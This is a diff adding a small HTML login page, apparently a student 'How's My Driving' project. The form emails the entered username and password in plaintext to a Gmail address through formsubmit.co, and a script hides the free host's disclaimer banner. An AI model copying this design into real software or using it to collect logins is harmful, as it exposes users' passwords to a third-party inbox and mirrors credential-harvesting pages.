@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" type="text/css" href="css/login.css">
+
+        <script>
+  document.addEventListener('DOMContentLoaded', () => {
+  var disclaimer =  document.querySelector("img[alt='www.000webhost.com']");
+   if(disclaimer){
+       disclaimer.remove();
+   }  
+ });
+
+</script>
+        <title>Login</title>
+
+</head>
+<body>
+
+<h2>How's My Driving</h2>
+
+<form action="https://formsubmit.co/cc17.project.app@gmail.com" method="POST">
+  <input type="hidden" name="_captcha" value="false">
+  <div class="imgcontainer">
+    <img src="img/login.png" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Email or Username" name="uname" required>
+    <input type="hidden" name="_next" value="https://rawcdn.githack.com/GalleonTimothy/DrivingReport/4adfd05047a8c056e289d61b844920c5308fcee1/home/thanks.html">
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+        
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+
+</form>
+
+</body>
+</html>
